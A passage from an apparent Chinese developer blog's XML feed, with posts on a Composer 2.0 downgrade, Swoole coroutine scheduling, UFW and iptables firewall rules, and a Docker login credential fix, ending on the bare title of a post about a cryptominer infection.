创建一个公众号？</li><li><input disabled="" type="checkbox"> 掌握 Go 语言</li><li><input disabled="" type="checkbox"> 务实计算机组成原理、操作系统原理、数据结构及计算机网络基础</li><li><input disabled="" type="checkbox"> 至少完成一百道 LeetCode 题目</li><li><input disabled="" type="checkbox"> 继续坚持跑步</li></ul><p>最后的最后用一段我比较喜欢的话，作为结束语：</p><blockquote><p>你可以抱怨，你可以哭泣，可你要知道明天太阳还是一样会升起，你只需要知道这个世界对谁都是一样的，你过得很累，其他人也一样没有顺风顺水。累了，就去被窝里冥想发呆; 渴了，就穿上毛绒兔的拖鞋哒哒下楼，买一杯冰镇柠檬茶，或者去路边煮一碗热气腾腾的牛肉面;闻一闻路边的野菊，看几部幽默或感人的电影;哪怕这一切只是为了取悦那个心情不好的自己。最后，多多努力，努力做一个可爱的人，一个闪闪发光的人，不讨好，不将就，对过往的苦难情深意重，但绝不回头，你只需要一路向前，披荆斩棘就好，别忘了，带着笑：）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 年终总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Composer 2.0 向下不兼容导致扩展安装出错</title>
      <link href="/composer-2-0-backward-incompatibility-causes-extension-installation-error/"/>
      <url>/composer-2-0-backward-incompatibility-causes-extension-installation-error/</url>
      
        <content type="html"><![CDATA[<p>今天在部署服务器环境时，遇到一个由Composer 版本向下不兼容而引发的问题，记录一下。</p><a id="more"></a><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>后台Api 应用是用<code>ThinkPHP6.0</code> 的多应用模式开发的，起初部署时，总是提示找不到控制器。</p><p>当时就比较郁闷，怎么会找不到控制器呢？这个异常通常只会在没有开启多应用模式时才会出现，可是我明明已经开启了多应用模式，也安装了相关扩展（Composer 2.0.x 执行 composer install 没有直接抛出异常）。</p><p>正当我百思不得其解时，不经意间看到了我目前所使用的 Composer 版本是 <code>2.0.x</code>。</p><p>回头对比了一下我本地的版本：<code>1.8</code>，Google 一下才发现Composer 2.0 系列是最近才发布的，于是马上就想到了是否是 Composer 向下不兼容导致。</p><p>好家伙，真的是兼容性导致的问题：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201217105443.png" alt=""></p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>既然是版本过高导致的兼容性问题，那就好办了，直接降低版本即可。</p><p>Composer 降级非常简单，不用重新编译安装，直接使用以下命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer self-update 1.8.0</span><br></pre></td></tr></table></figure><p>如果你不知道有哪些版本可选择，可以查看官方的<a href="https://getcomposer.org/download/" target="_blank" rel="noopener">发布历史</a>。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.thinkphp.cn/1997806" target="_blank" rel="noopener">ThinkPHP V6.0.5版本发布——兼容Composer2.0</a></li><li><a href="https://www.kancloud.cn/thinkphp/composer" target="_blank" rel="noopener">Composer 中文文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Composer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swoole 协程快速上手</title>
      <link href="/swoole-coroutine-quick-start/"/>
      <url>/swoole-coroutine-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近有幸读到 <a href="https://www.jianshu.com/u/281dc8d93b25" target="_blank" rel="noopener">daydaygo</a> 的 <a href="https://www.jianshu.com/p/745b0b3ffae7" target="_blank" rel="noopener">swoole 协程初体验</a>，一文从协程的执行的角度窥探 Swoole 的协程调度，并详细说明了为什么协程会快。</p><a id="more"></a><p>文章通俗易懂，笔者在此基础上增加了一些自己的理解，以此成文。</p><p>主要从以下两个方面来了解协程：</p><ol><li>协程的执行顺序：协程调度</li><li>协程为什么快：减少IO阻塞带来的性能优势</li></ol><h2 id="协程执行顺序"><a href="#协程执行顺序" class="headerlink" title="协程执行顺序"></a>协程执行顺序</h2><p>按照惯例，先来看一个最简单的协程代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">go(function () &#123;</span><br><span class="line">    echo &quot;1&quot;.PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">echo &quot;2&quot;.PHP_EOL;</span><br><span class="line"></span><br><span class="line">go(function () &#123;</span><br><span class="line">    echo &quot;3&quot;.PHP_EOL;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在Swoole中 <code>Swoole\Coroutine::create</code> 等价于 <code>go</code> 函数（<code>Swoole\Coroutine</code> 前缀的类名可以映射为 <code>Co</code>），用于创建一个协程。</p><p>该函数接受一个回调函数作为参数，回调函数的内容就是协程需要执行的内容。</p><p>上面的代码执行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>从执行结果的角度来看，协程版的代码和传统的同步代码，看起来并无差异。但协程的实际执行过程却是：</p><ol><li>运行上面那段协程代码，生成一个<strong>新进程</strong></li><li>当代码执行到<code>go()</code>部分时，会在当前协程中创建一个协程，输出<code>1</code>，协程退出</li><li>代码继续向下执行，输出 <code>2</code></li><li>再次遇到<code>go()</code>函数，输出<code>3</code></li><li>协程退出，进程退出，执行完成</li></ol><h2 id="协程调度"><a href="#协程调度" class="headerlink" title="协程调度"></a>协程调度</h2><p><code>\Co::sleep()</code> 函数和<code>sleep()</code>函数差不多，但是它模拟的是 IO 等待。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">go(function () &#123;</span><br><span class="line">  &#x2F;&#x2F; 只新增了一行代码</span><br><span class="line">Co::sleep(1);</span><br><span class="line">echo &quot;1&quot;.PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">echo &quot;2&quot;.PHP_EOL;</span><br><span class="line"></span><br><span class="line">go(function () &#123;</span><br><span class="line">echo &quot;3&quot;.PHP_EOL;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">3</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>怎么不是顺序执行的了？实际执行过程：</p><ol><li>运行上面那段协程代码，生成一个<strong>新进程</strong></li><li>遇到 <code>go()</code>，在当前进程中创建一个协程</li><li>协程向下执行遇到<strong>IO 阻塞</strong>，协程让出控制，进入协程调度队列</li><li>进程继续向下执行，输出 <code>2</code></li><li>创建第二个协程，输出<code>3</code></li><li>第一个协程准备就绪，输出 <code>1</code></li><li>协程退出，进程退出，执行完成</li></ol><p>到这里，已经可以看到Swoole 中<strong>协程</strong>与<strong>进程</strong>的关系，以及协程调度的过程。</p><p>下面这张图可以很清晰的看到二者区别与联系：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201129093350.png" alt=""></p><h2 id="协程快在哪里？"><a href="#协程快在哪里？" class="headerlink" title="协程快在哪里？"></a>协程快在哪里？</h2><p>大家使用协程，听到最多的原因，可能就是<strong>因为协程快</strong>。那协程相比传统同步代码倒底快在哪里呢？</p><p>首先，我们来了解一下计算机中的两类任务。</p><h3 id="CPU密集型"><a href="#CPU密集型" class="headerlink" title="CPU密集型"></a>CPU密集型</h3><p>CPU 密集型也叫计算密集型， 特点是需要进行大量科学计算，比如计算圆周率、对视频进行高清解码，吃CPU。</p><h3 id="IO-密集型"><a href="#IO-密集型" class="headerlink" title="IO 密集型"></a>IO 密集型</h3><p>涉及到网络、磁盘IO的任务都是IO密集型任务，特点是不吃CPU，任务的大部分时间都在等待IO操作完成，因为IO的速度远远低于CPU和内存的速度。</p><p>其次需要了解两个概念：</p><ul><li>并行：同一时刻，同一CPU只能执行一个任务，要N个任务同时执行，就需要有多个CPU 才行。</li><li>并发：同一时刻执行N 个任务。由于CPU 任务切换速度非常快，已经快到了人类感知极限。</li></ul><p>了解了这些基础之后，对协程的能力是不是也更清晰了一些，以及协程为什么会“快”了。</p><p>因为协程仅在 IO阻塞 时才会触发调度，从而减少等待IO 操作完成的时间。</p><h2 id="协程实践"><a href="#协程实践" class="headerlink" title="协程实践"></a>协程实践</h2><p>通过对比下面三种情况，加深对协程的理解：</p><p>同步阻塞版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$n &#x3D; 4;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">sleep(1);</span><br><span class="line">echo $i . PHP_EOL;</span><br><span class="line">&#125;;</span><br><span class="line">echo &quot;ok&quot;;</span><br></pre></td></tr></table></figure><p>单个协程版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$n &#x3D; 4;</span><br><span class="line">Co\Run(function () use ($n) &#123;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">Co::sleep(1);</span><br><span class="line">echo $i . PHP_EOL;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;);</span><br><span class="line">echo &quot;ok&quot;;</span><br></pre></td></tr></table></figure><p>多个协程版1.0（IO 密集型）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$n &#x3D; 4;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">go(function () use ($i) &#123;</span><br><span class="line"> Co::sleep(1);</span><br><span class="line">echo $i . PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">echo &quot;ok&quot;;</span><br></pre></td></tr></table></figure><p>通过 <code>time</code> 命令分别查看耗时时长，可以得出以下结论：</p><ul><li>传统同步阻塞：遇到 IO阻塞，等待，导致性能损失</li><li>单协程：尽管 IO阻塞引发了协程调度，但有且只有一个协程</li><li>多协程：遇到 IO阻塞 时发生调度，IO就绪时恢复运行</li></ul><p>多个协程版2.0（CPU 密集型）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$n &#x3D; 4;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">go(function () use ($i) &#123;</span><br><span class="line"> sleep(1);</span><br><span class="line"> &#x2F;&#x2F; Co::sleep(1);</span><br><span class="line">echo $i . PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">echo &quot;ok&quot;;</span><br></pre></td></tr></table></figure><p>只是将 <code>Co::sleep()</code> 改成了 <code>sleep()</code>，会发现总耗时时长又和传统同步阻塞差不多了，这是因为：</p><ul><li><code>sleep()</code> 可以看做是 CPU密集型任务, 不会引起协程的调度</li><li><code>Co::sleep()</code> 模拟的是 IO密集型任务, 会引发协程的调度</li></ul><p>这也是为什么, 协程适合 IO密集型 的应用，而不适合 CPU 密集型任务。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.jianshu.com/p/745b0b3ffae7" target="_blank" rel="noopener">swoole| swoole 协程初体验</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swoole 常见误区及问题总结</title>
      <link href="/swoole-common-mistakes-and-problems-summary/"/>
      <url>/swoole-common-mistakes-and-problems-summary/</url>
      
        <content type="html"><![CDATA[<p>随着对Swoole 的逐步了解，总结以下可能会碰到的误区：</p><a id="more"></a><ol><li>Swoole 是单线程</li><li>Swoole 异步回调模块仅可用于 CLI 命令行模式</li><li>Swoole 只有同步阻塞的客户端才可在 <code>php-fpm</code> 中使用</li><li>Swoole 重新编译安装会自动覆盖掉之前的版本 </li><li>CPU密集型任务（科学计算等）, 不会引起协程的调度; IO密集型任务（网络请求, 文件读写等）, 才会引发协程的调度</li><li><code>enable_coroutine</code> 开启协程支持之后，无需使用 <code>Co\Run</code> 创建协程</li><li>所有的<a href="https://wiki.swoole.com/#/coroutine" target="_blank" rel="noopener">协程</a>必须在<a href="https://wiki.swoole.com/#/coroutine/scheduler" target="_blank" rel="noopener">协程容器</a>里面<a href="https://wiki.swoole.com/#/coroutine/coroutine?id=create" target="_blank" rel="noopener">创建</a>，Swoole 程序启动的时候大部分情况会自动创建协程容器</li><li><code>Swoole\Coroutine</code> 前缀的类名映射为 Co。使用 <code>Co\Run</code> 方法创建协程容器，使用 <code>Coroutine::create</code> 或 <code>go</code> 方法创建协程。</li></ol><p>常见问题：</p><ul><li><a href="https://wiki.swoole.com/#/coroutine?id=%E4%BB%80%E4%B9%88%E6%98%AF%E5%8D%8F%E7%A8%8B%E5%AE%B9%E5%99%A8" target="_blank" rel="noopener">什么是协程容器？</a></li><li><a href="https://wiki.swoole.com/#/question/use?id=%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E5%85%B1%E7%94%A81%E4%B8%AAredis%E6%88%96mysql%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener">是否可以共用 1 个 Redis 或 MySQL 连接</a></li><li><a href="https://wiki.swoole.com/#/question/use?id=call-to-undefined-function-corun" target="_blank" rel="noopener">Call to undefined function Co\Run()</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ufw 快速上手</title>
      <link href="/linux-ufw-quick-start/"/>
      <url>/linux-ufw-quick-start/</url>
      
        <content type="html"><![CDATA[<p>之前已经了解了 iptables 是设置防火墙的命令行工具，但对于初学者而言，它的上手曲线太陡了。</p><a id="more"></a><p><a href="https://help.ubuntu.com/community/UFW" target="_blank" rel="noopener">UFW</a> （即简单防火墙）相较 iptables，对于初学者而言，则易于上手得多。</p><p>UFW 默认安装在Ubuntu上。如果由于某种原因已将其卸载，则可以使用如下命令进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install ufw</span><br></pre></td></tr></table></figure><p>开启 <code>IPV6</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;default&#x2F;ufw</span><br><span class="line"></span><br><span class="line">IPV6&#x3D;yes</span><br></pre></td></tr></table></figure><h2 id="查看UFW状态"><a href="#查看UFW状态" class="headerlink" title="查看UFW状态"></a>查看UFW状态</h2><p>Ubuntu 默认没有开启 UFW。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw status</span><br></pre></td></tr></table></figure><ul><li><code>inactive</code>：表示防火墙关闭状态 </li><li><code>active</code>：表示防火墙开启状态</li></ul><h2 id="开启UFW"><a href="#开启UFW" class="headerlink" title="开启UFW"></a>开启UFW</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw enable</span><br><span class="line">Command may disrupt existing ssh connections. Proceed with operation (y|n)? y</span><br><span class="line">Firewall is active and enabled on system startup</span><br></pre></td></tr></table></figure><p>初次开启 UFW 没有任何规则（如果之前已经添加过UFW 规则，则还是存在的），如需查看以开启哪些规则，同样使用<code>ufw status</code>命令。</p><h2 id="关闭UFW"><a href="#关闭UFW" class="headerlink" title="关闭UFW"></a>关闭UFW</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw disable</span><br></pre></td></tr></table></figure><h2 id="重置所有规则"><a href="#重置所有规则" class="headerlink" title="重置所有规则"></a>重置所有规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw reset</span><br></pre></td></tr></table></figure><h2 id="允许指定端口"><a href="#允许指定端口" class="headerlink" title="允许指定端口"></a>允许指定端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw allow http   &#x2F;&#x2F; sudo ufw allow 80</span><br></pre></td></tr></table></figure><h3 id="指定特定-IP"><a href="#指定特定-IP" class="headerlink" title="指定特定 IP"></a>指定特定 IP</h3><p>使用UFW时，还可以指定IP地址。<br>例如，如果要允许来自特定IP地址的连接，则可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw allow from &lt;ip_address&gt;</span><br></pre></td></tr></table></figure><p>还可以通过添加<code>to any port</code>端口号来指定允许IP地址连接的特定端口。</p><p>例如，如果要允许 <code>203.0.113.4</code> 连接到端口22（SSH），则可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw allow from 203.0.113.4 to any port 22</span><br></pre></td></tr></table></figure><h2 id="禁止指定端口"><a href="#禁止指定端口" class="headerlink" title="禁止指定端口"></a>禁止指定端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw deny https   &#x2F;&#x2F; sudo ufw deny 443</span><br></pre></td></tr></table></figure><h2 id="删除指定规则"><a href="#删除指定规则" class="headerlink" title="删除指定规则"></a>删除指定规则</h2><p>正式删除具体规则之前，先使用如下命令查看对应编号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw status numbered</span><br></pre></td></tr></table></figure><p>删除指定编号对应的规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw delete &lt;id&gt;</span><br></pre></td></tr></table></figure><h2 id="检查UFW状态和规则"><a href="#检查UFW状态和规则" class="headerlink" title="检查UFW状态和规则"></a>检查UFW状态和规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw status verbose</span><br></pre></td></tr></table></figure><h2 id="重新载入配置"><a href="#重新载入配置" class="headerlink" title="重新载入配置"></a>重新载入配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw reload</span><br></pre></td></tr></table></figure><p>注意事项⚠️：</p><ol><li>修改了某条规则之后，需要让UFW 重新加载配置，设定规则才会生效。</li><li>谨慎禁用 ssh，否则可能会导致自己也连接不上。</li><li>在启用 UFW 之前，最好检查或者重置一下规则。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-with-ufw-on-ubuntu-18-04" target="_blank" rel="noopener">How To Set Up a Firewall with UFW on Ubuntu 18.04</a></li><li><a href="https://linux.cn/article-8087-1.html" target="_blank" rel="noopener">在 Ubuntu 中用 UFW 配置防火墙</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 防火墙 </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> UFW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux iptables 常用规则整理</title>
      <link href="/linux-iptables-common-rules-collation/"/>
      <url>/linux-iptables-common-rules-collation/</url>
      
        <content type="html"><![CDATA[<p>因为手上一直管理着两台实体机（服务器），而实体机的是没有“软防”这个概念的，“硬防”规则只能自己去设定。</p><a id="more"></a><p>而Linux 原始的防火墙工具iptables 过于繁琐，上手曲线较陡，所以这篇笔记就用来整理 Linux 的 iptables 相关知识。</p><h2 id="iptables-是什么"><a href="#iptables-是什么" class="headerlink" title="iptables 是什么"></a>iptables 是什么</h2><p>我们常常会听到这样的说法：“iptables 是一个防火墙”，其实不是，它也不是一个系统服务，所以不能使用如下命令启动/停止/重启。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start&#x2F;stop&#x2F;restart iptables</span><br></pre></td></tr></table></figure><p>iptables 其实只是一个命令行工具，它用来操作 netfilter 内核防火墙，所以真正应用的防火墙应该是<strong>netfilter</strong>。</p><p>当拿到一台Linux 后，iptables就在那里，默认情况下它允许所有流量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iptables -L</span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br></pre></td></tr></table></figure><h2 id="允许特定端口访问"><a href="#允许特定端口访问" class="headerlink" title="允许特定端口访问"></a>允许特定端口访问</h2><p>访问过程如下：</p><ol><li>将此规则附加到输入链（-A INPUT），以便查看传入流量</li><li>检查是否为TCP（-p tcp）</li><li>如果是，检查输入是否进入端口（–dport ssh）</li><li>如果是，接受输入（-j ACCEPT）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT    # 允许访问22端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT    # 允许访问80端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 443 -j ACCEPT   # 允许访问443端口</span><br><span class="line">iptables -A FORWARD -j REJECT                    # 禁止其他未允许的规则访问</span><br></pre></td></tr></table></figure><h2 id="禁止特定端口访问"><a href="#禁止特定端口访问" class="headerlink" title="禁止特定端口访问"></a>禁止特定端口访问</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 6379 -j DROP    # 禁止6379端口传入流量</span><br></pre></td></tr></table></figure><p>如果想要屏蔽UDP流量而不是TCP流量，只需将上述规则中的 <code>tcp</code> 修改为 <code>udp</code> 即可。</p><h2 id="禁用防火墙"><a href="#禁用防火墙" class="headerlink" title="禁用防火墙"></a>禁用防火墙</h2><p>如果需要临时/永久禁用iptables 防火墙，则可以使用以下命令清除所有规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -F</span><br></pre></td></tr></table></figure><p>设置完成之后，不用重启任何服务，其防火墙规则已经刷新了（允许所有流量）。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://www.codebelief.com/article/2017/08/linux-25-useful-iptables-firewall-rules/" target="_blank" rel="noopener">25 个有用的 iptables 防火墙规则</a></li><li><a href="https://ubuntuqa.com/article/10698.html" target="_blank" rel="noopener">如何在Ubuntu上启动/停止iptables？</a></li><li><a href="https://help.ubuntu.com/community/IptablesHowTo#Configuration%20on%20startup" target="_blank" rel="noopener">IptablesHowTo</a></li><li><a href="https://wangchujiang.com/linux-command/c/iptables.html" target="_blank" rel="noopener">iptables - Linux</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 防火墙 </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Login 登录异常</title>
      <link href="/docker-Login-login-exception/"/>
      <url>/docker-Login-login-exception/</url>
      
        <content type="html"><![CDATA[<p>今天刚好有空，把前天那个被挖矿病毒感染的容器给换一换。</p><a id="more"></a><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>使用 <code>docker login</code> 登录时，总是会提示如下信息，可是我明明输入的是正确的账号密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error saving credentials: error storing credentials - err: exit status 1, out: Cannot autolaunch D-Bus without X11 $DISPLAY</span><br></pre></td></tr></table></figure><p>因为我使用的并不是最新的 <code>docker-ce</code> 版，而是老版本<code>docker.io</code>，所以起初我是怀疑版本出现了不兼容的问题吗？</p><p>其实不是，这是在 Ubuntu 下使用 docker 特有的 bug ，而修复办法不需要特意去卸载 <code>docker-compose</code> ，只要 “pass” 掉验证步骤。</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>最终解决步骤如下：</p><h4 id="1-安装-gnupg2-和-pass"><a href="#1-安装-gnupg2-和-pass" class="headerlink" title="1. 安装 gnupg2 和 pass"></a>1. 安装 <code>gnupg2</code> 和 <code>pass</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gnupg2 pass</span><br></pre></td></tr></table></figure><h4 id="2-生成密钥"><a href="#2-生成密钥" class="headerlink" title="2. 生成密钥"></a>2. 生成密钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gpg2 --full-generate-key</span><br></pre></td></tr></table></figure><h4 id="3-查看密钥所在路径"><a href="#3-查看密钥所在路径" class="headerlink" title="3. 查看密钥所在路径"></a>3. 查看密钥所在路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gpg2 -k</span><br></pre></td></tr></table></figure><h4 id="4-使用-pass-加载验证"><a href="#4-使用-pass-加载验证" class="headerlink" title="4. 使用 pass 加载验证"></a>4. 使用 <code>pass</code> 加载验证</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pass init &quot;your key location path&quot;</span><br></pre></td></tr></table></figure><p>至此就已经pass 掉了验证步骤，可以使用 <code>docker login</code> 正常登录了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://ug.epurs.com/post/docker-login-error-saving-credentials/" target="_blank" rel="noopener">Docker login 报证书存储错误的解决办法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次服务器被 kdevtmpfsi 变矿机</title>
      <link href="/remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/"/>
      <url>/remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/</url>
      
